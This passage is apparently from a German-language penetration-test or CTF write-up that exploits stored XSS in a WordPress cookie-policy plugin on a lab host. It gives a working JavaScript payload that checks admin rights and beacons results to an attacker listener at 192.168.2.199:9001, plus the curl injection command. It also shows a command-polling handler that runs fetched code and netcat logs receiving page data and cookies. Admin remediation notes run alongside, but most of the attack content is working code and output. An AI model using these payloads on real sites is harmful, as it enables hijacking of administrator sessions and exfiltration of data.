<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sicherstellen, dass <code>xss_handler.js</code> auf dem Python-HTTP-Server unter <code>192.168.2.199:8000</code> bereitliegt und die gewünschte Funktionalität implementiert (z.B. AJAX-Requests zum Erstellen eines Admin-Users, Auslesen von Seiteninhalten, Senden von Informationen an einen Listener).
<br><strong>Empfehlung (Admin):</strong> Die XSS-Schwachstelle beheben. Eine CSP, die das Laden von Skripten von nicht vertrauenswürdigen Quellen verbietet, würde auch diesen Angriff verhindern.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/shells]
└─# <span class="command">python3 -m http.server 8000</span></div>
        <pre>
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
<span class="password">192.168.2.203 - - [27/May/2025 15:00:00] "GET /revshell.php HTTP/1.1" 200 -</span>
192.168.2.203 - - [27/May/2025 15:01:02] "GET /revshell.php HTTP/1.1" 304 -
192.168.2.203 - - [27/May/2025 15:02:00] "GET /revshell.php HTTP/1.1" 304 -
192.168.2.203 - - [27/May/2025 15:03:00] "GET /revshell.php HTTP/1.1" 304 -
192.168.2.203 - - [27/May/2025 15:04:01] "GET /revshell.php HTTP/1.1" 304 -
192.168.2.203 - - [27/May/2025 15:05:00] "GET /revshell.php HTTP/1.1" 304 -
^C
Keyboard interrupt received, exiting.
</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Auf dem Angreifer-System wird ein einfacher Python-HTTP-Server auf Port 8000 gestartet. Dieser dient dazu, die JavaScript-Datei (<code>xss_handler.js</code> oder zuvor <code>revshell.php</code>) für den XSS-Payload bereitzustellen.
Die Log-Ausgaben zeigen, dass der Host <code>192.168.2.203</code> (der "Bot") wiederholt versucht, die Datei <code>revshell.php</code> abzurufen. Der erste Abruf resultiert in einem HTTP-Status 200 (OK), die folgenden in 304 (Not Modified), was bedeutet, dass der Bot die Datei bereits im Cache hat und sie nicht erneut heruntergeladen wurde.</p>
<p class="evaluation"><strong>Bewertung:</strong> Der Python-HTTP-Server funktioniert und liefert Dateien aus. Die wiederholten Anfragen von <code>192.168.2.203</code> nach <code>revshell.php</code> zeigen, dass der XSS-Payload, der auf diese Datei verweist, immer noch aktiv ist oder vom Bot gecached und erneut ausgeführt wird. Dies ist ein wichtiger Hinweis auf das Verhalten des Bots.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Datei <code>revshell.php</code> durch <code>xss_handler.js</code> ersetzen oder sicherstellen, dass <code>xss_handler.js</code> nun ausgeliefert wird, da dies der aktuelle Payload sein sollte. Die Log-Ausgaben des HTTP-Servers genau beobachten, um zu sehen, wann <code>xss_handler.js</code> vom Opfer-Browser (hoffentlich Admin) geladen wird.
<br><strong>Empfehlung (Admin):</strong> Netzwerk-Firewalls könnten so konfiguriert werden, dass sie den Zugriff auf bekannte "einfache" HTTP-Server-Ports (wie 8000) von extern blockieren, falls dies nicht für legitime Zwecke benötigt wird. Dies ist jedoch nur eine unterstützende Maßnahme; die XSS-Lücke ist das Hauptproblem.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/shells]
└─# <span class="command">vi xss_handler.js</span></div>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Die Datei <code>xss_handler.js</code> wird mit dem Texteditor <code>vi</code> geöffnet. Der Inhalt der Datei wird hier nicht gezeigt, aber es ist davon auszugehen, dass hier der JavaScript-Code entwickelt wird, der über die XSS-Schwachstelle im Browser des Opfers ausgeführt werden soll.</p>
<p class="evaluation"><strong>Bewertung:</strong> Dies ist ein notwendiger Schritt, um den eigentlichen XSS-Angriffscode zu erstellen oder zu bearbeiten. Der Inhalt von <code>xss_handler.js</code> ist entscheidend für den Erfolg der nächsten Phase des Angriffs.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> In <code>xss_handler.js</code> Logik implementieren, um:
1. Informationen über den Benutzer und die Seite zu sammeln (z.B. Cookies, Seitentitel, URL, Benutzeragent).
2. Diese Informationen an einen vom Angreifer kontrollierten Listener (z.B. Netcat auf Port 9001) zu senden.
3. Befehle von einem vom Angreifer kontrollierten Server (z.B. eine <code>commands.txt</code>-Datei auf dem Python-HTTP-Server) abzurufen und auszuführen.
4. WordPress-spezifische Aktionen durchzuführen, wie das Erstellen eines neuen Admin-Benutzers über AJAX-Aufrufe (unter Verwendung von Nonces, falls erforderlich).
<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion hier, aber es unterstreicht die Notwendigkeit, XSS zu verhindern, da beliebiger JavaScript-Code ausgeführt werden kann.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/shells]
└─# <span class="command">python3 -m http.server 8000</span></div>
        <pre>
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
<span class="password">192.168.2.203 - - [27/May/2025 15:07:01] "GET /xss_handler.js HTTP/1.1" 200 -</span>
<span class="password">192.168.2.203 - - [27/May/2025 15:07:01] code 404, message File not found</span>
<span class="password">192.168.2.203 - - [27/May/2025 15:07:01] "GET /commands.txt?r=0.4878505643278839 HTTP/1.1" 404 -</span>
192.168.2.203 - - [27/May/2025 15:07:06] code 404, message File not found
192.168.2.203 - - [27/May/2025 15:07:06] "GET /commands.txt?r=0.3139774066381831 HTTP/1.1" 404 -
192.168.2.203 - - [27/May/2025 15:07:11] code 404, message File not found
192.168.2.203 - - [27/May/2025 15:07:11] "GET /commands.txt?r=0.288203525016272 HTTP/1.1" 404 -
</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Der Python-HTTP-Server wird erneut gestartet.
Diesmal fordert der Host <code>192.168.2.203</code> (der Bot) erfolgreich die Datei <code>xss_handler.js</code> an (Status 200).
Unmittelbar danach versucht der Bot, eine Datei namens <code>commands.txt</code> vom selben Server abzurufen (mit einem zufälligen Cache-Busting-Parameter <code>?r=...</code>). Diese Anfragen schlagen mit Status 404 (File not found) fehl.
Die Logzeilen "code 404, message File not found" ohne GET-Request davor sind etwas untypisch für den Standard-Python-HTTP-Server, könnten aber auf interne Fehler bei der Pfadauflösung oder spezielle Anfragen hindeuten.</p>
<p class="evaluation"><strong>Bewertung:</strong> Der <code>xss_handler.js</code> wurde erfolgreich vom Bot geladen und ausgeführt. Das Skript versucht nun, wie erwartet, eine Befehlsdatei (<code>commands.txt</code>) vom Angreifer-Server zu laden, die aber noch nicht existiert. Dies zeigt, dass die Grundstruktur des interaktiven XSS-Handlers funktioniert.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Eine Datei namens <code>commands.txt</code> im Stammverzeichnis des Python-HTTP-Servers erstellen. Diese Datei sollte die JavaScript-Befehle enthalten, die der <code>xss_handler.js</code> im Browser des Opfers ausführen soll (z.B. <code>document.body.innerHTML = 'XSSed!';</code> zum Testen, oder komplexere Befehle zum Sammeln von Informationen).
<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion hier, aber es zeigt die interaktive Natur des Angriffs. Die XSS-Schwachstelle ist der Kern des Problems.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nc -lvnp 9001</span></div>
        <pre>
listening on [any] 9001 ...
<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.203] 59316</span>
GET /?data=%7B%22status%22%3A%22xss_handler_loaded%22%2C%22page_title%22%3A%22Shemhamphorash%20%E2%80%93%20Just%20another%20WordPress%20site%22%2C%22location%22%3A%22http%3A%2F%2Fshemhamphorash.local%2Fsitecore%2F%22%7D HTTP/1.1
Host: 192.168.2.199:9001
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://shemhamphorash.local/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Der Netcat-Listener auf Port 9001 empfängt Daten vom Bot (<code>192.168.2.203</code>). Die Daten werden als URL-kodierter JSON-String im GET-Parameter <code>data</code> gesendet.
Dekodiert lautet der JSON-String etwa:
<code>{"status":"xss_handler_loaded", "page_title":"Shemhamphorash – Just another WordPress site", "location":"http://shemhamphorash.local/sitecore/"}</code>
Dies zeigt, dass <code>xss_handler.js</code> erfolgreich geladen wurde und erste Informationen (Status, Seitentitel, URL) an den Angreifer zurückmeldet.</p>
<p class="evaluation"><strong>Bewertung:</strong> Hervorragend! Der interaktive XSS-Handler funktioniert wie geplant. Der Angreifer hat nun eine Bestätigung, dass sein Skript im Kontext der Zielseite ausgeführt wird und kann erste Umgebungsinformationen sammeln.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nun die Datei <code>commands.txt</code> auf dem HTTP-Server erstellen und mit JavaScript-Befehlen füllen, um weitere Aktionen im Browser des Bots auszuführen. Zum Beispiel könnte man versuchen, WordPress Nonces für Aktionen wie das Erstellen von Benutzern zu extrahieren oder direkt AJAX-Anfragen zum Erstellen eines Admin-Users zu formulieren.
<br><strong>Empfehlung (Admin):</strong> Die XSS-Schwachstelle dringend beheben. Die gesendeten Daten zeigen, welche Art von Informationen ein Angreifer leicht sammeln kann, sobald XSS möglich ist.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nano ~/Hackingtools/shells/commands.txt</span></div>
        <pre>document.documentElement.outerHTML;</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Die Datei <code>commands.txt</code> wird im Verzeichnis <code>~/Hackingtools/shells/</code> (dem Stammverzeichnis des Python-HTTP-Servers) erstellt und mit dem Inhalt <code>document.documentElement.outerHTML;</code> befüllt.
Dieser JavaScript-Code, wenn vom <code>xss_handler.js</code> im Browser des Opfers ausgeführt, wird den gesamten HTML-Quellcode der aktuell geladenen Seite (<code>&lt;html&gt;...&lt;/html&gt;</code>) zurückgeben.</p>
<p class="evaluation"><strong>Bewertung:</strong> Dies ist ein guter Testbefehl, um zu sehen, ob der <code>xss_handler.js</code> Befehle aus <code>commands.txt</code> korrekt abruft und ausführt und ob er die Ergebnisse zurück an den Angreifer sendet (z.B. an den Netcat-Listener).</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Python-HTTP-Server neu starten (falls er beendet wurde) und den Netcat-Listener aktiv halten. Beobachten, ob der Bot die <code>commands.txt</code> abruft und ob der HTML-Quellcode an den Listener gesendet wird.
<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion hier, aber dies demonstriert, wie ein Angreifer den gesamten Seiteninhalt, einschließlich möglicherweise sensibler Informationen in Kommentaren oder versteckten Feldern, auslesen kann.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nc -lvnp 9001</span></div>
        <pre>
listening on [any] 9001 ...
<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.203] 59442</span>
GET /?data=%7B%22status%22%3A%22xss_handler_loaded%22%2C%22page_title%22%3A%22Shemhamphorash%20%E2%80%93%20Just%20another%20WordPress%20site%22%2C%22location%22%3A%22http%3A%2F%2Fshemhamphorash.local%2Fsitecore%2F%22%7D HTTP/1.1
Host: 192.168.2.199:9001
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://shemhamphorash.local/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Der Netcat-Listener empfängt erneut eine Statusmeldung vom <code>xss_handler.js</code>, die identisch mit der vorherigen ist. Es scheint, dass das Ergebnis des Befehls <code>document.documentElement.outerHTML;</code> aus <code>commands.txt</code> hier (noch) nicht angekommen ist oder der Bot die <code>commands.txt</code> noch nicht neu geladen hat, nachdem sie erstellt wurde. Die empfangenen Daten zeigen nur den initialen "loaded"-Status.</p>
<p class="evaluation"><strong>Bewertung:</strong> Es gibt eine Verzögerung oder ein Problem bei der Übermittlung des Ergebnisses des ausgeführten Befehls. Der <code>xss_handler.js</code> muss so programmiert sein, dass er nicht nur Befehle abruft, sondern auch deren Ausführungsergebnisse an den Listener sendet.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Logik in <code>xss_handler.js</code> überprüfen. Sicherstellen, dass:
1.  <code>commands.txt</code> regelmäßig oder nach einem Signal neu geladen wird.
2.  Der Rückgabewert von <code>eval(command_from_file)</code> oder die Ausgabe des Befehls aktiv an den Listener (Port 9001) gesendet wird, idealerweise URL-kodiert.
Den Python-HTTP-Server-Log prüfen, ob <code>commands.txt</code> vom Bot abgerufen wurde, nachdem sie erstellt/geändert wurde.
<br><strong>Empfehlung (Admin):</strong> Keine spezifische Aktion hier, außer der fortwährenden Notwendigkeit, die XSS-Lücke zu schließen.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/shells]
└─# <span class="command">vi commands2.txt</span></div>
    </div>
</div>
<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/shells]
└─# <span class="command">cat commands2.txt</span></div>
        <pre>'BOT_IS_ACTIVE_AND_READING_COMMANDS';</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Eine neue Befehlsdatei, <code>commands2.txt</code>, wird erstellt und mit dem einfachen JavaScript-String <code>'BOT_IS_ACTIVE_AND_READING_COMMANDS';</code> befüllt. Dies dient wahrscheinlich als einfacherer Test, um zu sehen, ob der Bot diese neue Datei liest und ob irgendeine Form von Ergebnis (selbst wenn es nur die Auswertung dieses Strings ist) zurückgesendet wird.</p>
<p class="evaluation"><strong>Bewertung:</strong> Ein guter Schritt zur Fehlersuche und Vereinfachung des Tests, um die grundlegende Befehlsausführung und Ergebniskommunikation des <code>xss_handler.js</code> zu überprüfen.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sicherstellen, dass <code>xss_handler.js</code> nun <code>commands2.txt</code> (oder einen generischen Namen, der auf diese Datei zeigt) anstelle von <code>commands.txt</code> lädt, oder den Inhalt von <code>commands.txt</code> mit diesem String überschreiben.
<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">while true; do nc -lvnp 9001; done</span></div>
        <pre>
listening on [any] 9001 ...
connect to [192.168.2.199] from (UNKNOWN) [192.168.2.203] 60226
GET /?handler_status=%7B%0A%20%20%22status%22%3A%20%22xss_handler_debug_v2_loaded%22%2C%0A%20%20%22page_title%22%3A%20%22Shemhamphorash%20%E2%80%93%20Just%20another%20WordPress%20site%22%2C%0A%20%20%22location%22%3A%20%22http%3A%2F%2Fshemhamphorash.local%2Fsitecore%2F%22%2C%0A%20%20%22user_agent%22%3A%20%22Mozilla%2F5.0%20(X11%3B%20Linux%20x86_64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F100.0.4896.60%20Safari%2F537.36%22%0A%7D HTTP/1.1
Host: 192.168.2.199:9001
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/,/*;q=0.8
Referer: http://shemhamphorash.local/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

listening on [any] 9001 ...
</pre>
    </div>
</div>
<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/shells]
└─# <span class="command">python3 -m http.server 8000</span></div>
        <pre>
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
<span class="password">192.168.2.203 - - [27/May/2025 15:38:01] "GET /xss_handler.js HTTP/1.1" 304 -</span>
<span class="password">192.168.2.203 - - [27/May/2025 15:38:01] "GET /commands2.txt?r=0.29605442420029804 HTTP/1.1" 200 -</span>
192.168.2.203 - - [27/May/2025 15:38:08] "GET /commands2.txt?r=0.042833484650171005 HTTP/1.1" 200 -
192.168.2.203 - - [27/May/2025 15:38:16] "GET /commands2.txt?r=0.5592573648723842 HTTP/1.1" 200 -
</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Der Netcat-Listener (in einer <code>while true</code>-Schleife, um nach jeder Verbindung neu zu starten) empfängt eine neue Statusmeldung vom Bot. Der Status ist nun <code>xss_handler_debug_v2_loaded</code>, was auf eine aktualisierte Version des Handler-Skripts hindeutet. Es werden wieder Seitentitel, Ort und User-Agent gesendet.
Der Python-HTTP-Server-Log zeigt, dass der Bot <code>xss_handler.js</code> (Status 304, also aus dem Cache) und dann wiederholt <code>commands2.txt</code> (Status 200, also erfolgreich geladen) abruft. Die Cache-Busting-Parameter (<code>?r=...</code>) sind unterschiedlich, was darauf hindeutet, dass der Handler versucht, die Befehlsdatei regelmäßig neu zu laden.</p>
<p class="evaluation"><strong>Bewertung:</strong> Fortschritt! Der Bot lädt nun die neue Befehlsdatei <code>commands2.txt</code>. Die Statusmeldung vom Handler wurde ebenfalls aktualisiert (<code>debug_v2_loaded</code>). Allerdings sendet der Handler immer noch keine Ergebnisse der ausgeführten Befehle aus <code>commands2.txt</code> zurück an den Netcat-Listener, sondern nur die Standard-Statusinformationen.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Logik in <code>xss_handler.js</code> (Version "debug_v2") muss angepasst werden, um das Ergebnis des in <code>commands2.txt</code> enthaltenen JavaScript-Codes (<code>'BOT_IS_ACTIVE_AND_READING_COMMANDS';</code>) tatsächlich an den Netcat-Listener zu senden. Z.B. durch: <code>fetch(listener_url + '?result=' + encodeURIComponent(eval(command_string)));</code>
<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion, das Problem bleibt die XSS.</p>

<div class="code-block">
    <div class="terminal">
        <pre>
listening on [any] 9001 ...
connect to [192.168.2.199] from (UNKNOWN) [192.168.2.203] 60364
GET /?handler_status=%7B%0A%20%20%22status%22%3A%20%22xss_handler_debug_v2_loaded%22%2C%0A%20%20%22page_title%22%3A%20%22Shemhamphorash%20%E2%80%93%20Just%20another%20WordPress%20site%22%2C%0A%20%20%22location%22%3A%20%22http%3A%2F%2Fshemhamphorash.local%2Fsitecore%2F%22%2C%0A%20%20%22user_agent%22%3A%20%22Mozilla%2F5.0%20(X11%3B%20Linux%20x86_64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F100.0.4896.60%20Safari%2F537.36%22%0A%7D HTTP/1.1
Host: 192.168.2.199:9001
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://shemhamphorash.local/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

listening on [any] 9001 ...
connect to [192.168.2.199] from (UNKNOWN) [192.168.2.203] 60478
GET /?handler_status=%7B%0A%20%20%22status%22%3A%20%22xss_handler_debug_v3_loaded%22%2C%0A%20%20%22page_title%22%3A%20%22Shemhamphorash%20%E2%80%93%20Just%20another%20WordPress%20site%22%2C%0A%20%20%22location%22%3A%20%22http%3A%2F%2Fshemhamphorash.local%2Fsitecore%2F%22%2C%0A%20%20%22user_agent%22%3A%20%22Mozilla%2F5.0%20(X11%3B%20Linux%20x86_64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F100.0.4896.60%20Safari%2F537.36%22%2C%0A%20%20%22cookies_available%22%3A%20%22easy_cookies_policy_check%3D43d687474703a2f2%22%0A%7D HTTP/1.1
Host: 192.168.2.199:9001
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://shemhamphorash.local/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

listening on [any] 9001 ...
</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Der Netcat-Listener zeigt weitere eingehende Verbindungen vom Bot <code>192.168.2.203</code>.
Die erste Verbindung meldet immer noch den Status <code>xss_handler_debug_v2_loaded</code>.
Die zweite Verbindung, kurz darauf, meldet einen neuen Status: <code>xss_handler_debug_v3_loaded</code>. Diese neuere Version des Handlers sendet nun auch die verfügbaren Cookies (zumindest die nicht-HttpOnly Cookies, hier <code>easy_cookies_policy_check=...</code>) mit.
Dies zeigt, dass der Pentester das <code>xss_handler.js</code>-Skript weiterentwickelt.</p>
<p class="evaluation"><strong>Bewertung:</strong> Die iterative Entwicklung des <code>xss_handler.js</code> ist ein normaler Prozess. Die Version "v3" kann nun auch Cookies auslesen und senden, was eine Verbesserung darstellt, auch wenn es nicht die kritischen HttpOnly-Session-Cookies sind. Es fehlt immer noch die Rückmeldung der Ergebnisse aus <code>commands2.txt</code>.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Weiter an <code>xss_handler.js</code> arbeiten, um die Ergebnisse von ausgeführten Befehlen (aus der Befehlsdatei) an den Listener zu senden. Die Cookie-Exfiltration ist ein netter Bonus, aber das Hauptziel ist die interaktive Befehlsausführung oder das Ausführen komplexerer Aktionen wie das Erstellen eines Admin-Users.
<br><strong>Empfehlung (Admin):</strong> Die XSS-Lücke bleibt das Kernproblem.</p>

<div class="code-block">
    <div class="terminal">
        <pre>
Wir wissen:

    Die XSS-Injektion mit dem blessed-Cookie funktioniert ({"status":"OK",...}).

    Der Admin-Bot (192.168.2.203) führt die XSS aus und kann Skripte von deinem Python-Server laden.

    Die Login-Cookies sind HttpOnly.
</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Eine Zusammenfassung des aktuellen Wissensstandes:
1.  Die Stored XSS-Injektion über die Einstellungen des "easy-cookies-policy"-Plugins mittels des <code>blessed</code>-Benutzer-Cookies ist erfolgreich.
2.  Ein "Admin-Bot" mit der IP <code>192.168.2.203</code> besucht die Seite, führt den XSS-Payload aus und kann JavaScript-Dateien vom Angreifer-Server laden.
3.  Die WordPress-Login-Cookies sind als <code>HttpOnly</code> konfiguriert, was den direkten Diebstahl via <code>document.cookie</code> verhindert.</p>
<p class="evaluation"><strong>Bewertung:</strong> Klare Zusammenfassung der Situation. Das Hauptproblem für den Angreifer ist, dass er zwar Code im Kontext des Admin-Bots ausführen kann, aber nicht direkt dessen Haupt-Login-Cookies stehlen kann. Daher muss der Fokus darauf liegen, Aktionen *im Namen* des Admin-Bots auszuführen.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Strategie muss darauf abzielen, JavaScript zu schreiben, das im Browser des Admin-Bots AJAX-Anfragen an das WordPress-Backend sendet, um administrative Aktionen durchzuführen (z.B. einen neuen Admin-Benutzer anlegen, Plugins manipulieren, Themes ändern, um eine Webshell einzufügen). Dies erfordert das Auslesen von WordPress-Nonces, falls diese für die entsprechenden Aktionen benötigt werden.
<br><strong>Empfehlung (Admin):</strong> Selbst wenn Cookies HttpOnly sind, ist XSS immer noch extrem gefährlich. Die XSS-Schwachstelle muss dringend behoben werden. Zusätzlich können Maßnahmen wie eine strenge Content Security Policy und Web Application Firewalls helfen, die Ausnutzung zu erschweren.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">JS_PAYLOAD="(async function() { var listener = 'http://192.168.2.199:9001'; var isAdmin = false; var status_code = 0; var final_url = 'unknown'; var error_msg = 'none'; try { const response = await fetch('/sitecore/wp-admin/index.php', {credentials: 'include', redirect: 'manual'}); status_code = response.status; final_url = response.url; if (response.status === 200 && response.url.includes('/wp-admin/index.php')) { isAdmin = true; } else if (response.status === 302 || response.type === 'opaqueredirect' || (response.url && response.url.includes('wp-login.php'))) { isAdmin = false; } } catch (e) { error_msg = e.message; } var i = new Image(); i.src = listener + '/?bot_is_admin=' + isAdmin + '&amp;status=' + status_code + '&amp;final_url=' + encodeURIComponent(final_url) + '&amp;err=' + encodeURIComponent(error_msg) + '&amp;r=' + Math.random(); })();"</span></div>
    </div>
</div>
<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">curl -X POST 'http://shemhamphorash.local/sitecore/wp-admin/admin-ajax.php' \
-H "Cookie: ${BLESSED_COOKIE}" \
--data-urlencode "action=easy_cookies_policy_save_settings" \
--data-urlencode "maintext=&lt;script&gt;${JS_PAYLOAD}&lt;/script&gt;" \
--data-urlencode "background=black" \
--data-urlencode "transparency=100" \
--data-urlencode "close=accept" \
--data-urlencode "expires=30" \
--data-urlencode "enabled=true" \
--data-urlencode "display=onpage" \
--data-urlencode "position=top" \
--data-urlencode "button_text=Checking Admin..." \
--data-urlencode "text_color=#ffffff"</span></div>
        <pre>{"status":"OK","text":"Configuration data updated","url":"http:\/\/shemhamphorash.local\/sitecore","cookie":"easy_cookies_policy_warning"}</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Zuerst wird ein neuer JavaScript-Payload in der Bash-Variable <code>JS_PAYLOAD</code> definiert. Dieser Payload ist eine asynchrone Funktion, die versucht, auf <code>/sitecore/wp-admin/index.php</code> zuzugreifen.
    <code>fetch('/sitecore/wp-admin/index.php', {credentials: 'include', redirect: 'manual'})</code>: Führt eine Anfrage an das Admin-Dashboard durch. <code>credentials: 'include'</code> stellt sicher, dass vorhandene Cookies (also die des Admin-Bots) mitgesendet werden. <code>redirect: 'manual'</code> verhindert automatische Weiterleitungen, um den Statuscode und die URL der Antwort direkt auswerten zu können.
    Es prüft, ob die Antwort ein Status 200 ist und die URL <code>/wp-admin/index.php</code> enthält (Indikator für Admin-Zugriff) oder ob es eine Weiterleitung zur Login-Seite ist (Indikator für keinen Admin-Zugriff).
    Das Ergebnis (<code>isAdmin</code>, <code>status_code</code>, <code>final_url</code>, <code>error_msg</code>) wird dann per "Image-Beacon"-Technik an den Listener (<code>192.168.2.199:9001</code>) gesendet.
Anschließend wird dieser <code>JS_PAYLOAD</code> mittels <code>curl</code> wieder in die XSS-Schwachstelle injiziert. Der Platzhalter <code>${BLESSED_COOKIE}</code> wird hier verwendet, was voraussetzt, dass diese Variable zuvor in der Shell korrekt gesetzt wurde.</p>
<p class="evaluation"><strong>Bewertung:</strong> Dies ist ein intelligenter Payload, um zu überprüfen, ob der Bot, der den XSS-Code ausführt, tatsächlich Admin-Rechte in WordPress hat. Die Verwendung von <code>fetch</code> mit <code>credentials: 'include'</code> und <code>redirect: 'manual'</code> ist korrekt, um den Login-Status zu ermitteln. Die Image-Beacon-Technik ist eine gängige Methode, um Daten von einer XSS-Schwachstelle zu exfiltrieren.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Netcat-Listener auf <code>192.168.2.199:9001</code> beobachten, um die Ergebnisse dieses Checks zu empfangen. Wenn <code>bot_is_admin=true</code> zurückkommt, ist das ein starkes Signal, dass der Bot Admin-Rechte hat und Aktionen wie das Erstellen eines neuen Admin-Users möglich sein sollten.
<br><strong>Empfehlung (Admin):</strong> Die XSS-Schwachstelle schließen. Zusätzlich Mechanismen zur Sitzungsvalidierung und Anomalieerkennung implementieren, um verdächtige Aktivitäten von Benutzerkonten (auch von Bots) zu erkennen.</p>

<div class="code-block">
    <div class="terminal">
        <pre>
listening on [any] 9001 ...
connect to [192.168.2.199] from (UNKNOWN) [192.168.2.203] 34376
GET /?<span class="password">bot_is_admin=false</span>&amp;status=0&amp;final_url=http%3A%2F%2Fshemhamphorash.local%2Fsitecore%2Fwp-admin%2Findex.php&amp;err=none&amp;r=0.47286297092981866 HTTP/1.1
Host: 192.168.2.199:9001
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://shemhamphorash.local/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

listening on [any] 9001 ...
connect to [192.168.2.199] from (UNKNOWN) [192.168.2.203] 34450
GET /?<span class="password">bot_is_admin=false</span>&amp;status=0&amp;final_url=http%3A%2F%2Fshemhamphorash.local%2Fsitecore%2Fwp-admin%2Findex.php&amp;err=none&amp;r=0.7137915019635757 HTTP/1.1
Host: 192.168.2.199:9001
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://shemhamphorash.local/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

listening on [any] 9001 ...
</pre>
    </div>
</div>
